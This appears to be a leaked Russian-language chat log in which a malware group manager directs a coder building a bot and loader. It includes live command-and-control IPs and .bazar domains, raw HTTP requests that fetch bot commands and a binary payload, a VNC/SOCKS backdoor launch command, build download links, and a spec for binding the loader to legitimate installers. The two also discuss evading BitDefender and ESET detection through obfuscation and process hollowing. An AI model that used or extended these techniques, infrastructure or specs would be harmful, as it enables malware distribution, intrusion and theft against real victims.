[26.07.21 12:17:36] geraldo:		Привет!
Принял
[26.07.21 13:41:03] geraldo:		Готово!
```
https://privatlab.com/s/v/8RRR7e9lMBhVeNlGDZoD
https://privatlab.com/s/d/8RRR7e9lMBhVeNlGDZoD/4YROm#delete
```
[26.07.21 14:48:43] geraldo:		Принял
[26.07.21 15:23:48] geraldo:		Сделал
```
https://privatlab.com/s/v/kMMMzYdA2pU4xWGLA5JN
https://privatlab.com/s/d/kMMMzYdA2pU4xWGLA5JN/3blON#delete
``` 
Wild'у отправил
[28.07.21 09:12:51] geraldo:		Привет! Получил
[28.07.21 09:18:27] geraldo:		Понятно. Почищу при следующей сборке
[28.07.21 10:28:27] geraldo:		Будет
[28.07.21 11:21:43] geraldo:		Увидел. Будет сделано
[28.07.21 15:49:18] geraldo:		Повтори, пожалуйста
[28.07.21 15:49:30] geraldo:		Повтори, пожалуйста
[28.07.21 15:49:36] geraldo:		Не дошли сообщения
[28.07.21 15:50:07] geraldo:		все, теперь дошли
[28.07.21 16:50:52] geraldo:		Для режима rundll32 dll-ка выходит чистая, если имя точки входа поменять на DllRegisterServer, то детектится
[28.07.21 16:51:25] geraldo:		Что-то новое
`https://dyncheck.com/scan/id/364916c4b739aea7a3200ff6f6fed7b5`
[28.07.21 16:59:52] geraldo:		Готово
```
https://privatlab.com/s/v/yddmV6qGgkt50V7Om2B3
https://privatlab.com/s/d/yddmV6qGgkt50V7Om2B3/4AX8q#delete
```
[28.07.21 17:04:44] geraldo:		Да, буду сейчас разбираться
[29.07.21 13:59:57] geraldo:		Сборка готова
```
https://privatlab.com/s/v/jjjx99gx5QszM8970kRM
https://privatlab.com/s/d/jjjx99gx5QszM8970kRM/370NR#delete
``` 
Wild'у тоже отправил
[30.07.21 10:44:54] geraldo:		Привет!
Получил
[02.08.21 14:02:52] geraldo:		Готово!
```
https://privatlab.com/s/v/xAAaBDb4NrCewz7gR9pk
https://privatlab.com/s/d/xAAaBDb4NrCewz7gR9pk/dj6kj#delete
```
[02.08.21 14:03:35] geraldo:		Wild'у отправил сборку группы g4
[03.08.21 14:00:35] geraldo:		Привет! Задачи принял
[03.08.21 16:54:11] geraldo:		Привет!
Какие адреса?
[03.08.21 16:56:02] geraldo:		Принято. Сейчас займусь
[03.08.21 17:29:07] geraldo:		Готово!
```
https://privatlab.com/s/v/omm768yk9lI3V0pEzByB
https://privatlab.com/s/d/omm768yk9lI3V0pEzByB/4ARGx#delete
```
[05.08.21 15:17:11] collin:		[18:09:17] <kaktus> привет! 
[18:10:58] <kaktus> сделай сырые запросы для бота и лоадера на новой основной админке: 
1) для бота с командой /2; 
2) для лоадера основной на загрузку бота
пришли мне их с ответами серва
т.е. через postman, curl или подобный софт 
[18:11:32] <kaktus> с новыми адресами вот этими делай: 
[18:11:34] <kaktus> бот:
134.122.91.133
161.35.223.189
164.90.164.50
167.172.46.184

лоадер:
164.90.164.50
167.172.46.184
134.122.91.133
161.35.223.189 
[18:11:45] <kaktus> подтверди что получил задачу
[05.08.21 15:19:11] geraldo:		Привет!
Принял
[05.08.21 15:50:05] geraldo:		Пробую, но пока возвращает "502 Bad Gateway"
[05.08.21 15:52:01] geraldo:		Вот так делаю:
`GET http://134.122.91.133/dairy/milk`
[05.08.21 15:52:50] geraldo:		И в таблице задаю поля Date и Cookie во вкладке Headers
[05.08.21 16:02:16] collin:		https вместо http нужен
[05.08.21 16:04:28] geraldo:		А, вот так 200 OK
[05.08.21 16:04:39] collin:		в постмане делаешь?
[05.08.21 16:04:46] geraldo:		Да
[05.08.21 16:05:27] collin:		внизу Console, там история запросов, заходишь в нужный в нем "Show raw log" нажимай и в таком виде копипасть
[05.08.21 16:07:38] geraldo:		```
GET https://134.122.91.133/dairy/milk
200
1396 ms
Warning: Self signed certificate
GET /dairy/milk HTTP/1.1
Date: Thu, 05 Aug 2021 15:55:47 GMT
Cookie: slxr=PmturdRkaSocZdm03bDbF2qq1QFvm1ZAjHk%2Fh%2FKDBuFI3CEKznxFs1q91a%2FnykgCWtDIJgaMKOK29klxmyIRfly%2F4ZbzojX9RI2JyqnSur2d%2BvqDcKUP1xCKJL66CKUvvcnzlIbRMsqrXlONky5DF2JPZlCDsSYu7O2BuKDemxoGxyslpIVJApKwOGzMxYvc4rERHocCrQoAwRz1xPPyBAxOXTynC4iB3o977Nkg%2BrEW9WHqmHCrYlea3FcFwaJe%2BG4%2BcHompRupOufCer5HN%2FvG65w75AMYNaEyLqyhhEZ7DZe7yZuWLFs6hTJX40AnNk9VxnbbpNhHlXCE2yKj4A%3D%3D
User-Agent: PostmanRuntime/7.28.3
Accept: */*
Postman-Token: 010ea38b-3228-4332-af1b-635479827a19
Host: 134.122.91.133
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
 
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 2
Connection: keep-alive
Date: Thu, 05 Aug 2021 16:04:08 GMT
Set-Cookie: UP_LIMIT=VcpRgrv5bDhK3SIVL2Oi9KTg5C6lUsBuODOh3azAwmaOkAXbXdNkNxW2DpXMJ51EWKknupOswYskn0JEQESHPNKlJOsKrh8SmgqXYAxdansB0Z7bnKHU0MPkx0nWHd6eviM8gWqiy6yUtNyIMuHPKeu8cFtxyzfjy66hWGNgakTjEHMSJUM7uQcxvnmUWac7uZqZ8drKxL4yyIcXDbBD4DPI3M5UJe7OdaaULFl9OCOvsa5Onn3v8TOFmTv6WEVo
Set-Cookie: edit_value=358400
Set-Cookie: GL_ID=qqbbFz2u2WdN92pEc1paV0AxAnXO1s5sAWE8lyx0CmJdJYke3BG0RJrBWJVOomzdhTLnlgT7rpepXtFws5BwYtwzBe5OY9bI3HcaMMq0eD674MR0iKXYi7WakASeJTnHF0qG408WW9RDd0NEVBDGpM7WpAfI2AaHYYGk85rCHSAvE3mkdh6YWdmXX7KU33FsKoQGUf6L91q5n8qLQOCpQ4KzhYABQiTHKXlaSaVa9KH6lTyAL8uvcyhdmQpqkmhq
Set-Cookie: C_SEED=Q5cE0Tb2vbBuvO9X
Set-Cookie: start_i=Ko4AFrn0eaBGrUkoe2aUSQjPLFvSS9q2mIgYI0AgLog
Set-Cookie: DOWN_LIMIT=QwGuzzcBZKTzwSLfob9%2BKjqRD%2BWunc2orwEBcePaYKQMpRnWWycZjJtxq%2Fzs8pAZcVNDfP6hgBE89QmHk14Hw5jQrTHIz%2BiLKTqL%2FLH95DPvQMK%2Bqsw9dK9J3LTDhTXOQlFLB3GjUq8Id5mMenzapS0isoATwzi4c0GsuGkBa7haEIYZxiW2tdXGZv3eFbq%2Bl1rpUrZwpCFxq%2BPM03K51pM3V6W8Jin6YEu2tgLu74%2FepzhpXwOCL4i8NZEUfpAxvtmsRW24PdkFsrT%2ByK%2BF%2FmD9BseYmGzNScAAyBdhHiiXEk0zyAYCYuzAhUCWei5SmO2lXybRUgQWs7VTCXjFxA%3D%3D
Set-Cookie: A_const=digWkYT9fc4zWprR
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
 
OK
```
[05.08.21 16:08:09] collin:		это лоадер?
[05.08.21 16:08:23] geraldo:		Это запрос команды ботом
[05.08.21 16:09:04] collin:		+ сохранил
[05.08.21 16:09:25] geraldo:		Сейчас для загрузчика сделаю
[05.08.21 16:18:50] geraldo:		```
GET https://164.90.164.50/dairy/milk
200
36.86 s
Warning: Self signed certificate
GET /dairy/milk HTTP/1.1
Date: Thu, 05 Aug 2021 16:08::12 GMT
Cookie: a=f7omZODYhAYs5OLD4uirExJkHEr8dtGr2Zf%2B5Z92H%2FKomPVgPe6IMiIC9ByTBfJDYa8I2k8qFnMEMLZXB1Wedzf%2FZKGz3jKG6kxbOMX1Vb5hkPzeK42GWL%2BAGtZTcNDQOMu4V893olwgJT1mAl1abNqcfq3BQOvZlSNc8oRi%2F36ihEHNfYk0hh3kksfJH9XTzSDSp4Lad3dfg%2B2hS3rXNVP02joezrbv6E5OdmiR66mOSXknyuxfH2196Z%2Fq8woNVUPyYvTCzhldFqB3hOtTV8TthMzr6AQUDGNRdpLnK%2Bk1MhozJeknvqM%2BKgl%2BZ6PWrpzKHzAe6NbRhvFAvk7ncg%3D%3D
User-Agent: PostmanRuntime/7.28.3
Accept: */*
Postman-Token: 803fc050-ef59-4e52-97df-05e0736cf77a
Host: 164.90.164.50
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
 
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: application/octet-stream
Content-Length: 2485760
Connection: keep-alive
Date: Thu, 05 Aug 2021 16:17:13 GMT
Content-Description: File Transfer
Content-Disposition: attachment; filename=TsD2x5tdj7
Content-Transfer-Encoding: binary
Expires: 0
Cache-Control: must-revalidate, post-check=0, pre-check=0
Pragma: public
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
```
[05.08.21 16:25:06] collin:		+
[05.08.21 16:25:15] collin:		почему у тебя бот такой большой - 2.5 МБайт?
[05.08.21 16:28:45] collin:		как дела по доработкам у тебя? в первую очередь задачи "Задержка перед первым запросом к командному серверу" и "Шумовые сетевые запросы" интересуют
[05.08.21 16:29:39] collin:		также у нас возросла актуальность обновления по команде 10 4 - у задачи 337 поменял приоритет на высокий
[05.08.21 16:29:56] collin:		после этих двух - следующей в очереди возьми в работу команду 10 4
[05.08.21 16:31:27] collin:		что по задаче 336 - она у тебя в работе второй месяц уже висит?
[05.08.21 16:36:09] geraldo:		Бот компилирую со всеми возможными ключами обфускатора.
Задержку сделаю в ближайшее время
[05.08.21 16:37:41] geraldo:		В задаче 336 не знаю куда сохранить адреса. Хотел в COM-объектах где-нибудь сохранить подальше, но не нашёл пока как это сделать.
[05.08.21 16:39:03] geraldo:		Шумовые сетевые запросы пока не начинал делать.
[05.08.21 16:44:02] collin:		`В задаче 336 не знаю куда сохранить адреса` - достаточно в реестр в ветку HKCU\Software раздел добавить и туда севить в обфусцированном виде
[05.08.21 16:44:20] collin:		и это только в лоадере и сейчас это уже не так актуально
[05.08.21 16:44:49] collin:		с последней модернизацией DGA2
[05.08.21 16:45:16] collin:		сделай рантайм-списки только в своем процессе
[05.08.21 16:45:42] collin:		и этого хватит
[05.08.21 16:47:39] collin:		рантайм-списки - в боте и лоадере*
[06.08.21 19:14:09] collin:		привет!
[06.08.21 19:14:58] collin:		1) в понедельник составь и пришли мне отчет о проделанной работе за эту неделю подробный - какие задачи решал, сколько примерно времени на каждую ушло
[06.08.21 19:15:41] collin:		2) объясни обстановку по твоему гит - почему там по одному коммиту в неделю?
[06.08.21 19:16:59] collin:		3) со след. недели веди ежедневный подробный отчет в редмайне о проделанной работе - трудозатраты с разбивкой на подзадачи, добавляй комментарии в задачи, ставь новые если надо
[06.08.21 19:18:44] collin:		суть в чем - у тебя очень низкая скорость решения задач по доработке по сравнению со всеми остальными кодерами БК, поэтому мне нужна прозрачность того что и как ты делаешь
[06.08.21 19:19:17] collin:		хочу понять есть ли узкие места, затем будем оптимизировать если они есть
[06.08.21 19:19:31] collin:		подтверди получение
[06.08.21 19:21:36] geraldo:		Я понял.
В гит загружаю результаты за неделю обычно.
[06.08.21 19:22:00] geraldo:		Если много кода пишу, тогда несколько раз в неделю
[06.08.21 19:22:23] collin:		ты можешь не загружать - но делай разными коммитами, потом все можно запушить на сервер одной командой раз в неделю
[06.08.21 19:22:59] collin:		к каждому свое пояснение - какая задача, номер таска в редмайне - чтобы было видно какой код к чему относится
[06.08.21 19:23:32] collin:		это описано в "наставление разработчику" и "оформление кода и сборок"  плюс дополнительно писал же об этом, обозначил порядок ведения
[06.08.21 19:24:12] collin:		было такое?
[06.08.21 19:25:18] geraldo:		Да это понятно. У меня не всегда получается разбивать коммиты. Иногда несколько задач делаю параллельно. Что-нибудь оптимизирую, подчищаю, рефакторинг делаю.
[06.08.21 19:27:35] collin:		ну ок если так удобнее - тогда раз несколько тасков в одном коммите - кратко в пояснениях к нему перечисляй все решенные задачи с указанием номеров из редмайна
[06.08.21 19:29:22] geraldo:		Да, мне лучше тогда в RELEASE_NOTES.txt писать то, что сделано.
[06.08.21 19:29:43] collin:		это само собой но отдельно
[06.08.21 19:30:30] collin:		а в коммитах нужно для того - что если вдруг вылезла ошибка, в каком-то функционале - оперативно найти нужные правки кода, которые его касались
[06.08.21 19:31:46] collin:		как вариант - вести два файла RELEASE_NOTES.txt и RELEASE_NOTES_GIT.txt  например - в последнем с инфой о коммитах и их соответствия задачам
[06.08.21 19:32:21] collin:		плюс в нем подробней с разбивкой задачи на этапы, а в первом же пишем только когда реализована целиком какая-то атомарная сущность
[06.08.21 19:32:45] geraldo:		Всё, теперь понял.
[06.08.21 19:33:30] collin:		а по гит - одна задача может фигурировать в нескольких разных правках
[06.08.21 19:36:11] geraldo:		На этой неделе возился с загрузчиком. У меня  же там был статический детект в режиме regsvr32.
[06.08.21 19:36:41] geraldo:		И перевод каретки для команды запуска скриптов проверял
[06.08.21 19:37:51] geraldo:		Точнее чуть ранее - в сб, вс
[06.08.21 19:42:06] collin:		вот распиши поподробнее мне, сколько времени на эти задачи ушло, в чем сложности были, что как проверял и тд
[06.08.21 19:42:15] geraldo:		Задачи, которые ещё не решены:
Шумовые сетевые запросы
Реализовать выполнение команды 10 4 "обновление"
Реализовать первую версию функционала "Полиморфизм по поведению"
Планирую в ближайшее время сделать задержку и обновление
[06.08.21 19:43:10] collin:		`У меня же там был статический детект в режиме regsvr32` напомни ESET или битдефендер там было?
[06.08.21 19:43:55] geraldo:		Там несколько АВ было. BitDefender тоже был.
У меня там много задач со статусом "Тестирование". Они в общем-то решены, просто я их не убираю пока
[06.08.21 19:45:02] collin:		из тестирования переводи в состояние Готово сам через 1-2 недели
[06.08.21 19:45:08] collin:		даже если по факту это не проверялась в работе
[06.08.21 19:45:45] collin:		у тебя почему-то BitDefender тяжко идет, помню тогда над статикой 2 или 3 недели возился с ним
[06.08.21 19:47:09] collin:		у меня он по максимуму 2 дня занимал, у других тоже не больше
[06.08.21 19:48:11] geraldo:		Да это всё детекты Gen:Variant.Razy.
[06.08.21 19:48:31] geraldo:		Как появятся, так хоть убейся
[06.08.21 19:49:29] geraldo:		Только сейчас более-менее стало понято из-за чего они
[06.08.21 19:51:34] collin:		пробуй шумовой экспорт, у рояла это помогает
[06.08.21 19:52:21] collin:		и смена параметров обфускации LLVM - не общая а разная для каждого модуля
[06.08.21 19:53:30] collin:		ну не каждого какой-то один модуль можно взять и в нем крутить (без наследования настроек от проекта) и общую для проекта
[06.08.21 19:53:41] collin:		у меня такое в криптере последнее время, пока детально его не оптимизировал спасает
[06.08.21 19:55:01] geraldo:		Ну параметры обфускации иногда меняю. Да, это помогает. А у тебя часто бывают Gen:Variant.Razy?
[06.08.21 19:58:35] collin:		на криптере бывает - на выходных криптах бк
[06.08.21 19:58:51] collin:		в самом бк реже
[09.08.21 13:18:00] collin:		привет!
[09.08.21 13:18:26] collin:		добавил тебе несколько тасков в редмайн - ознакомься, включи в свой план работ с учетом указанных приоритетов
[09.08.21 13:18:47] geraldo:		Привет! Да, уже увидел
[10.08.21 16:08:13] collin:		привет!
[10.08.21 16:08:34] collin:		1. у тебя в поле path в отчете GetSystemInfo выводится командная строка вместо имени файла, проверь
[10.08.21 16:08:49] collin:		2. убери сообщения на русском языке из отладочного лога
[10.08.21 16:08:59] collin:		и в боте и лоадере, все
[10.08.21 16:13:21] geraldo:		Привет!
Хорошо
[10.08.21 16:13:39] geraldo:		В лоадере всё на английском языке
[10.08.21 16:13:56] collin:		ну значит в боте
[10.08.21 16:14:11] collin:		сегодня в гите заметил
[11.08.21 09:54:31] geraldo:		Привет!
Хотел бы в отпуск уйти на пару недель.
[11.08.21 09:54:36] geraldo:		Отпустишь?
[11.08.21 09:55:27] collin:		привет!
[11.08.21 09:55:31] collin:		когда хочешь?
[11.08.21 09:58:05] geraldo:		Хотелось бы с этой пятницы включительно, т.е. с 13 августа и на 2 недели, так чтобы 30 выйти.
[11.08.21 09:59:22] collin:		а если с начала сентября не пойдешь?
[11.08.21 09:59:33] collin:		пойдет*
[11.08.21 10:00:45] collin:		а то я вотпуск со след.недели ухожу на 2 недели
[11.08.21 10:00:54] collin:		тоже
[11.08.21 10:01:00] collin:		без нас на 2 кодера бк меньше сразу
[11.08.21 10:02:53] geraldo:		Подумать надо
[11.08.21 16:19:05] collin:		привет!
[11.08.21 16:19:20] collin:		что насчет отпуска надумал - отложишь до сентября?
[11.08.21 16:20:52] geraldo:		Да в сентябре неудобно
Хотя бы на неделю сходить
[11.08.21 16:21:12] geraldo:		числа до 20
[11.08.21 16:23:42] geraldo:		Если сборки нужно будет делать постараюсь на связь выйти
[11.08.21 16:25:22] collin:		в какое время сможешь на связь выйти, когда сделать?
[11.08.21 16:26:21] collin:		а если еще позднее - октябрь-ноябрь не пойдет?
[11.08.21 16:27:15] geraldo:		Не, там всё равно буду на связи в это время.
[11.08.21 16:27:37] collin:		по вечерам после 18?
[11.08.21 16:27:53] collin:		и собрать сможешь в это время?
[11.08.21 16:30:21] geraldo:		Проблема в чём. Нужно будет найти точку доступа, чтобы выйти в интернет. Пока не знаю, какой там интернет. Вроде бы по слухам, интернет там нормальный. Т.е. проблема не со временем, а с интернетом. Если что, сборку смогу сделать в любое время.
[11.08.21 16:32:09] geraldo:		Т.е. если с интернетом у меня проблем не будет, ты можешь спокойно идти в отпуск
[11.08.21 16:33:44] collin:		и когда ты узнаешь точно будут проблемы с инетом или нет?
[11.08.21 16:34:23] geraldo:		Завтра уточню ближе к вечеру. Если интернета не будет, тогда всё отменяется(
[12.08.21 08:51:35] collin:		привет!
[12.08.21 08:51:42] collin:		новое ТЗ, приоритет средний
[12.08.21 08:51:51] collin:		```
Режим лоадера generic-glue
"Клей" - это решение по соединению полезной нагрузки с маскирующим софтом - легитимное приложение или установщик ПО в единый исполняемый файл (exe). При запуске исполняемого файла одновременно запускается полезная нагрузка и маскирующий софт, при этом оба выполняются в одном процессе (нагрузка запускается в отдельном потоке).
Режим является модификацией режима generic, с учетом следующих изменений и дополнений:
1. полезная нагрузка в формате exe не используется для криптования (склеивания).
2. предусмотрено два способа запуска исполнительного файла, полученного в результате склеивания: с запуском маскирующего софта и полезной нагрузки, и только запуск полезной нагрузки.
По умолчанию полезная нагрузка запускается вместе с маскирующим софтом.
Способ запуска задается первым параметром командной строки после символа слеш: "/%prm_no_soft%", где prm_no_soft - константное текстовое значение, которое:
- задается на стадии сборки лоадера БК;
- задается в качестве параметра при формировании итогового исполнительного файла системой сборки "Клей";
- используется в алгоритмах итогового исполнительного файла для определения способа запуска.
В качестве полезной нагрузки выступает модуль лоадера БК в формате dll.
Лоадер должен определять способ своего запуска и завершаться (после выполнения своего функционала) в зависимости от этого:
- для способа "с маскирующим софтом" - завершение через return из DllMain().
- для способа "без маскирующего софта" - завершение через ExitProcess().
3. При запуске способом "с маскирующим софтом" лоадер должен перезапустить себя способом "без маскирующего софта" с минимальной задержкой от момента запуска (от 1 до 5 секунд), после чего продолжить дальнейшую работу.
В команды для закрепления и последующего перезапуска модуля лоадера (если используется) обязательно добавлять параметр prm_no_soft.
```
[12.08.21 08:51:57] collin:		подтверди получение
[12.08.21 09:00:24] geraldo:		Привет! Получил
[12.08.21 09:01:11] collin:		насчет отпуска твоего,
[12.08.21 09:01:23] collin:		что в итоге - получится ли онлайн появляться, в какие дни и время?
[12.08.21 09:01:49] geraldo:		Да вот узнаю сейчас
[12.08.21 09:45:32] collin:		сделай сборку для новой основной
[12.08.21 09:45:51] collin:		группа 22, x64, generic
[12.08.21 09:46:01] collin:		```
адреса (домены) первого этапа
бот:
141.136.0.244
64.225.67.59
45.89.106.80
64.225.71.185

лоадер:
45.89.106.80
64.225.71.185
141.136.0.244
64.225.67.59

домены второго этапа
бот:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar

лоадер:
whitestorm9p.bazar
bluecloud21c.bazar
yellowdownpour81.bazar
```
[12.08.21 09:46:05] collin:		скинь мне
[12.08.21 09:51:00] geraldo:		Принял
[12.08.21 11:08:41] geraldo:		Всё готово!
https://privatlab.com/s/v/4jjMaZGYzWUNQ5EkBy6V
https://privatlab.com/s/d/4jjMaZGYzWUNQ5EkBy6V/2Wp0o#delete
[12.08.21 11:11:27] collin:		+
[12.08.21 11:13:47] geraldo:		Повтори, пожалуйста, задание. 
Браузер перезагрузил, всё пропало(
[12.08.21 11:14:29] collin:		нового нет, я подтверждение направил
[12.08.21 11:14:36] collin:		старое продублировать?
[12.08.21 11:17:17] geraldo:		Ну вон то задание про клей)
[12.08.21 11:17:31] geraldo:		Режим -клей.
Забыл как клей переводится)
[12.08.21 11:17:58] collin:		```
Режим лоадера generic-glue
"Клей" - это решение по соединению полезной нагрузки с маскирующим софтом - легитимное приложение или установщик ПО в единый исполняемый файл (exe). При запуске исполняемого файла одновременно запускается полезная нагрузка и маскирующий софт, при этом оба выполняются в одном процессе (нагрузка запускается в отдельном потоке).
Режим является модификацией режима generic, с учетом следующих изменений и дополнений:
1. полезная нагрузка в формате exe не используется для криптования (склеивания).
2. предусмотрено два способа запуска исполнительного файла, полученного в результате склеивания: с запуском маскирующего софта и полезной нагрузки, и только запуск полезной нагрузки.
По умолчанию полезная нагрузка запускается вместе с маскирующим софтом.
Способ запуска задается первым параметром командной строки после символа слеш: "/%prm_no_soft%", где prm_no_soft - константное текстовое значение, которое:
- задается на стадии сборки лоадера БК;
- задается в качестве параметра при формировании итогового исполнительного файла системой сборки "Клей";
- используется в алгоритмах итогового исполнительного файла для определения способа запуска.
В качестве полезной нагрузки выступает модуль лоадера БК в формате dll.
Лоадер должен определять способ своего запуска и завершаться (после выполнения своего функционала) в зависимости от этого:
- для способа "с маскирующим софтом" - завершение через return из DllMain().
- для способа "без маскирующего софта" - завершение через ExitProcess().
3. При запуске способом "с маскирующим софтом" лоадер должен перезапустить себя способом "без маскирующего софта" с минимальной задержкой от момента запуска (от 1 до 5 секунд), после чего продолжить дальнейшую работу.
В команды для закрепления и последующего перезапуска модуля лоадера (если используется) обязательно добавлять параметр prm_no_soft.
```
[12.08.21 11:18:20] geraldo:		Спасибо)
[12.08.21 12:04:18] collin:		я со следующей недели в отпуске, вместо меня elroy - по всему что касается БК
до конца этой недели:
1) еще раз изучи все задания в багтрекере редмайн из тех что не закрыты (в работе или не приступал);
2) задай вопросы если они будут
в первую очередь по задачам с приоритетом Высокий
[12.08.21 12:04:20] collin:		подтверди получение
[12.08.21 12:05:32] geraldo:		Получил
[12.08.21 12:07:23] collin:		ежедневную подробную отчетность в редмайн - пока больше не надо
[12.08.21 12:07:47] collin:		в гит - все веди с учетом последних указаний
[12.08.21 12:09:20] geraldo:		Всё ясно. Задачи увидел. Сейчас делаю шумовые запросы.
[30.08.21 08:20:22] collin:		привет!
[30.08.21 08:20:32] collin:		как успехи по доработкам БК, есть ли сложности/вопросы?
[30.08.21 08:36:58] geraldo:		Привет!
Покопался с техникой process hollowing.
Нашёл способ, как избавиться от вызова NtUnmapViewOfSection.
Может это пригодится при борьбе с детектами
[30.08.21 08:37:32] collin:		ага, я тоже такой вариант сейчас использую
[30.08.21 08:37:39] geraldo:		Задачи из Redmine сделал (не все).
[30.08.21 08:38:17] geraldo:		Парсеры командеых строк написал для rundll32, regsvr32
[30.08.21 08:42:11] geraldo:		В RELEASE_NOTES_GIT.txt написал короткую инструкцию по отключению CRT и лишнего кода (от 1 августа).
[30.08.21 08:42:32] geraldo:		Может что-то для себя найдёшь полезное.
[30.08.21 08:42:55] collin:		ага спасибо, гляну
[30.08.21 08:43:01] geraldo:		Недавно дописывал её
[30.08.21 08:43:54] collin:		что по таскам 336 и 460?
[30.08.21 08:46:25] geraldo:		460 - готово
[30.08.21 08:47:34] geraldo:		В задаче 336 сохранение на диск не сделал пока.
[30.08.21 08:49:12] geraldo:		Ты тогда говорил, что эта задача не так актуальна, поэтому пока отложил её
[30.08.21 08:55:10] geraldo:		Часа через 3-4 буду если что
[30.08.21 09:00:15] collin:		ок
[30.08.21 13:17:20] collin:		```
Опросник - профиль трафика в БК
1. В каком порядке перебираются адреса на 1 шаге стратегии поиска - всегда в одинаковом или в случайном?
2. Есть ли ограничение размера рантайм-списка 1 шага стратегии поиска? Если есть - по какому признаку удаляются из него адреса при достижении лимита?
3. Как осуществляется передача команд в боте (подписи даты в лоадере) - через куки/хедеры/может быть и то и другое в одной сборке?
4. Каким образом формируются имена куки / хедеров для передачи мусорных значений и команд боту (подписи даты в лоадере)?
4.1 формат имени (словарь из хардкод списка, слова+префиксы, генерация произвольных буквенных / цифро-буквенных значений и т.д.)?
4.2 случайность имен - генерируются новые для каждого запроса или - генерируется список имен для сборки/машины/при запуске - по аналогии с "Fake Cookies" в карточке группы, затем из этого списка выбираются имена для очередного запроса?
5. Генерируются ли мусорные куки или хедеры, или и то и другое, или это зависит от способа передачи команды боту / подписи лоадера?
6. Сколько мусорных куки / хедеров формируется в запросах (в каком диапазоне случайное значение)?
7. Какой формат (форматы) значений мусорных куки / хедеров используется?
один формат (например - малые латинские буквы и цифры комбинация длины в случайном диапазоне от.. до..) или разные (например, целое десятичное число, hex-значение, base64 и т.д.)?
```
[30.08.21 13:17:31] collin:		скинь мне инфу по своей сборке до конца завтрашнегоь дня
[30.08.21 13:17:38] geraldo:		Хорошо
[30.08.21 13:42:06] collin:		в редмайне новый таск короткий "Изменение параметра netdomain в отчете Get SystemInfo" постарайся его побыстрее сделать
[30.08.21 13:42:29] geraldo:		Хорошо
[31.08.21 16:18:12] geraldo:		Сборку отправил Porfirio.
[31.08.21 16:18:19] collin:		+
[31.08.21 16:18:27] geraldo:		Ответы на опросник вчерашний:
1. Всегда в одинаковом.
2. Ограничения нет.
3. Вторым параметром функции HttpSendRequestA.
4.1. Случайная последовательность строчных букв короткой длины.
4.2. Каждый раз генерируются новые случайные имена.
5. Нет.
[31.08.21 16:18:27] collin:		как успехи по опроснику?
[31.08.21 16:20:11] collin:		`3. Вторым параметром функции HttpSendRequestA.` - команда /подпись даты передается в куки или в другогм хедере с префиксом X_?
[31.08.21 16:20:36] collin:		`4.2. Каждый раз генерируются новые случайные имена.` - для каждого запроса?
[31.08.21 16:20:56] geraldo:		Cookie
[31.08.21 16:21:04] collin:		`5. Нет.` - т.е. только одна команда, нет ни куки ни хедеров с мусором всегда?
[31.08.21 16:21:29] geraldo:		Мусора нет
[31.08.21 16:21:35] collin:		ок
[31.08.21 16:21:40] geraldo:		Вообще никогда мусора нет
[31.08.21 16:22:16] geraldo:		Случайные имена для каждого нового запроса.
[01.09.21 17:58:39] collin:		привет!
[01.09.21 17:58:57] collin:		обнаружили в твоей сборке что не завершается команда RunDLL по таймауту, отчет бот не направляет
[01.09.21 17:59:06] collin:		тебе Порфирио скидывал контрольный пример?
[01.09.21 17:59:20] collin:		возможно не во всех модулях, именно на одном
[01.09.21 18:10:35] geraldo:		Привет. Мы вчера с Porfirio смотрели одного бота, который не отправлял отчёт.
[01.09.21 18:11:39] geraldo:		Я, конечно, посмотрю. Но, точно помню, что этот момент отлаживал. Т.е., в принципе, бот  меня отправляет отчёт, если завершение происходит по таймауту.
[01.09.21 18:12:02] geraldo:		А вот эту dll-ку можно получить для отладки?
[01.09.21 18:14:57] geraldo:		VNCSRV_41534_1.dll
[01.09.21 18:15:54] collin:		```
i=``@<(POUI"vd,k
https://file.io/MWZgelecu918
```
[01.09.21 18:17:16] collin:		в Parameters, в билдере команд вот такую команду:
[01.09.21 18:17:18] geraldo:		Получил
[01.09.21 18:17:28] collin:		```
DllRegisterServer --id %id% --group g5 --ip 149.3.170.236
```
[01.09.21 18:17:40] geraldo:		Понял
[01.09.21 18:17:50] collin:		если будет сразу завершаться - возможно с прокладкой vnc моста что-то не то,
[01.09.21 18:18:00] collin:		попробуй тогда последний айпишник поменять на один из этих:
[01.09.21 18:18:29] collin:		89.41.182.96
45.42.202.178
[01.09.21 18:18:36] collin:		а так после запуска должна висеть сессия
[01.09.21 18:19:00] collin:		только на тестовой ВМ проверяй - сессия сразу уходит в рабочий список
[01.09.21 18:19:10] collin:		из него кто-то может подрубиться по внц или соксу
[01.09.21 18:19:45] geraldo:		Хорошо. Отдельную ВМ тогда сделаю
[01.09.21 18:21:26] collin:		можешоь сначала проверить на тестовом модуле testdll1_X64.dll
[01.09.21 18:21:33] collin:		из набора к регламенту
[01.09.21 18:22:21] collin:		чтобы он висел до принудительного завершения в Parameters пиши: `TestDllMainFunction noexit`
[01.09.21 18:22:27] collin:		возможно уже там проявится
[01.09.21 18:22:53] geraldo:		Понял. Прямо сейчас проверю.
[01.09.21 18:45:41] geraldo:		Всё понял. Это из-за того, что эта dll-ка сама себя перезапускает. К завтрашнему дню постараюсь всё устранить.
[01.09.21 18:46:03] geraldo:		Это не критично. Бот всё равно работает, процесс тоже прерывается. отчёт только не отправляется
[02.09.21 17:22:47] geraldo:		Сделал сборку для группы tst4:
```
https://privatlab.com/s/v/er7Zwqx6VJhAeo49Qq97
https://privatlab.com/s/d/er7Zwqx6VJhAeo49Qq97/4xVm3#delete
```
[02.09.21 17:24:01] collin:		+
[02.09.21 17:24:33] collin:		разобрался с завершением задачи по таймауту, ошибка проявлвяется?
[02.09.21 17:25:16] geraldo:		Всё исправил. Там была проблема в том, что файл не удалялся после завершения процесса.
[02.09.21 17:25:48] geraldo:		Не ожидал такого когда писал код
[02.09.21 17:27:48] geraldo:		Замену строки %group% ещё сделал и вычисление IntegrityLevel тоже добавил
[02.09.21 17:46:32] collin:		ок
[02.09.21 17:46:41] collin:		в этой сборке уже есть которую скинул?
[02.09.21 17:46:53] geraldo:		Да
[06.09.21 11:14:39] geraldo:		Принято
[07.09.21 11:14:14] geraldo:		Привет!
